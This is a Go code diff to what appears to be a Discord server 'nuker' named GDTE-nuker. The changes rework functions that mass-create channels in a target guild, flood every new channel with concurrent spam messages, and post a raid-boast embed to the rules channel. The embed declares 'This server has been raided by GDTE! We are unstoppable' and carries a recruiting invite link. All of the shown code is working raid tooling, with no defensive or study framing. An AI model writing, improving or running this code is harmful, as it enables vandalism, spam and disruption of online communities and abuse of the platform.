@@ -209,7 +209,7 @@ func apiRequest(method, url, token string, body []byte) (*http.Response, error) 
 	return client.Do(req)
 }
 
-func createChannelAPI(guildID, name, token string) (*discordgo.Channel, error) {
+func createChannelAPI(guildID, name, token string) (string, error) {
 	payload := map[string]interface{}{
 		"name": name,
 		"type": 0,
@@ -217,17 +217,73 @@ func createChannelAPI(guildID, name, token string) (*discordgo.Channel, error) {
 	body, _ := json.Marshal(payload)
 	resp, err := apiRequest("POST", "https://discord.com/api/v9/guilds/"+guildID+"/channels", token, body)
 	if err != nil {
-		return nil, err
+		return "", err
 	}
 	defer resp.Body.Close()
+
+	respBody, _ := io.ReadAll(resp.Body)
+
 	if resp.StatusCode != 200 && resp.StatusCode != 201 {
-		return nil, fmt.Errorf("status %d", resp.StatusCode)
+		return "", fmt.Errorf("status %d: %s", resp.StatusCode, string(respBody))
 	}
-	var ch discordgo.Channel
-	if err := json.NewDecoder(resp.Body).Decode(&ch); err != nil {
-		return nil, err
+
+	var result map[string]interface{}
+	if err := json.Unmarshal(respBody, &result); err != nil {
+		return "", err
 	}
-	return &ch, nil
+
+	id, ok := result["id"].(string)
+	if !ok {
+		return "", fmt.Errorf("no id in response")
+	}
+	return id, nil
+}
+
+func sendMessageAPI(channelID, content, token string) error {
+	payload := map[string]interface{}{
+		"content": content,
+	}
+	body, _ := json.Marshal(payload)
+	resp, err := apiRequest("POST", "https://discord.com/api/v9/channels/"+channelID+"/messages", token, body)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != 200 && resp.StatusCode != 204 {
+		respBody, _ := io.ReadAll(resp.Body)
+		return fmt.Errorf("status %d: %s", resp.StatusCode, string(respBody))
+	}
+	return nil
+}
+
+func sendEmbedAPI(channelID, token string) error {
+	payload := map[string]interface{}{
+		"embeds": []map[string]interface{}{
+			{
+				"title":       "GDTEnuker",
+				"description": "This server has been raided by **GDTE**!\n\nWe are unstoppable.\nJoin: https://discord.gg/TbkZR5fhUs",
+				"color":       0x242929,
+				"thumbnail": map[string]string{
+					"url": "https://cdn.discordapp.com/attachments/1514638682664210705/1515732847493906482/Screenshot_2026-06-14_235923.png",
+				},
+				"footer": map[string]string{
+					"text": "@everyone https://github.com/agehantonu/GDTE-nuker",
+				},
+				"timestamp": time.Now().Format(time.RFC3339),
+			},
+		},
+	}
+	body, _ := json.Marshal(payload)
+	resp, err := apiRequest("POST", "https://discord.com/api/v9/channels/"+channelID+"/messages", token, body)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != 200 && resp.StatusCode != 204 {
+		respBody, _ := io.ReadAll(resp.Body)
+		return fmt.Errorf("status %d: %s", resp.StatusCode, string(respBody))
+	}
+	return nil
 }
 
 func main() {
@@ -385,7 +441,7 @@ func nukeGuild(s *discordgo.Session, token, guildID, serverName, iconURL, roleNa
 	}
 	emojiWg.Wait()
 
-	var createdChannels []*discordgo.Channel
+	createdChannelIDs := make([]string, 0, channelCount)
 	if channelCount > 0 {
 		logInfo(fmt.Sprintf("[i] Creating %d channels via API v9...", channelCount))
 		preGeneratedNames := make([]string, channelCount)
@@ -393,7 +449,6 @@ func nukeGuild(s *discordgo.Session, token, guildID, serverName, iconURL, roleNa
 			preGeneratedNames[i] = generateChannelName(channelNames)
 		}
 
-		createdChannels = make([]*discordgo.Channel, 0, channelCount)
 		var chMu sync.Mutex
 		var chCreateWg sync.WaitGroup
 
@@ -401,47 +456,47 @@ func nukeGuild(s *discordgo.Session, token, guildID, serverName, iconURL, roleNa
 			chCreateWg.Add(1)
 			go func(idx int, n string) {
 				defer chCreateWg.Done()
-				ch, err := createChannelAPI(guildID, n, token)
+				chID, err := createChannelAPI(guildID, n, token)
 				if err == nil {
 					chMu.Lock()
-					createdChannels = append(createdChannels, ch)
+					createdChannelIDs = append(createdChannelIDs, chID)
 					chMu.Unlock()
-					logOK("channel make", ch.Name)
+					logOK("channel make", n)
 				} else {
-					logFAIL("channel make", n)
+					logFAIL("channel make", err.Error())
 				}
 			}(i, name)
 		}
 		chCreateWg.Wait()
-		logInfo(fmt.Sprintf("[+] Created %d/%d channels!", len(createdChannels), channelCount))
+		logInfo(fmt.Sprintf("[+] Created %d/%d channels!", len(createdChannelIDs), channelCount))
 	}
 
-	if messagesPerChannel > 0 && len(createdChannels) > 0 {
-		totalMsgs := len(createdChannels) * messagesPerChannel
+	if messagesPerChannel > 0 && len(createdChannelIDs) > 0 {
+		totalMsgs := len(createdChannelIDs) * messagesPerChannel
 		logInfo(fmt.Sprintf("[i] Sending %d messages...", totalMsgs))
 		var msgWg sync.WaitGroup
 		msgSuccess := 0
 		msgErr := 0
 		var msgMu sync.Mutex
 
-		for _, ch := range createdChannels {
+		for _, chID := range createdChannelIDs {
 			for i := 0; i < messagesPerChannel; i++ {
 				msgWg.Add(1)
 				go func(cID string) {
 					defer msgWg.Done()
-					_, err := s.ChannelMessageSend(cID, messageContent)
+					err := sendMessageAPI(cID, messageContent, token)
 					if err != nil {
 						msgMu.Lock()
 						msgErr++
 						msgMu.Unlock()
-						logFAIL("message false", cID)
+						logFAIL("message false", err.Error())
 					} else {
 						msgMu.Lock()
 						msgSuccess++
 						msgMu.Unlock()
 						logOK("message ok", cID)
 					}
-				}(ch.ID)
+				}(chID)
 			}
 		}
 		msgWg.Wait()
@@ -450,32 +505,20 @@ func nukeGuild(s *discordgo.Session, token, guildID, serverName, iconURL, roleNa
 
 	logInfo("[i] Sending embed to rules channel...")
 	channels, _ = s.GuildChannels(guildID)
-	var rulesCh *discordgo.Channel
+	var rulesChID string
 	for _, ch := range channels {
 		if strings.Contains(strings.ToLower(ch.Name), "rules") || strings.Contains(strings.ToLower(ch.Name), "rule") {
-			rulesCh = ch
+			rulesChID = ch.ID
 			break
 		}
 	}
 
-	if rulesCh != nil {
-		embed := &discordgo.MessageEmbed{
-			Title:       "\U0001F480 GDTEnuker",
-			Description: "This server has been raided by **GDTE**!\n\nWe are unstoppable.\nJoin: https://discord.gg/TbkZR5fhUs ",
-			Color:       0x242929,
-			Thumbnail: &discordgo.MessageEmbedThumbnail{
-				URL: "https://cdn.discordapp.com/attachments/1514638682664210705/1515732847493906482/Screenshot_2026-06-14_235923.png",
-			},
-			Footer: &discordgo.MessageEmbedFooter{
-				Text: "@everyone https://github.com/agehantonu/GDTE-nuker",
-			},
-			Timestamp: time.Now().Format(time.RFC3339),
-		}
-		_, err := s.ChannelMessageSendEmbed(rulesCh.ID, embed)
+	if rulesChID != "" {
+		err := sendEmbedAPI(rulesChID, token)
 		if err != nil {
 			logFAIL("embed send", err.Error())
 		} else {
-			logOK("embed send", rulesCh.Name)
+			logOK("embed send", rulesChID)
 		}
 	} else {
 		logFAIL("embed send", "no rules channel found")
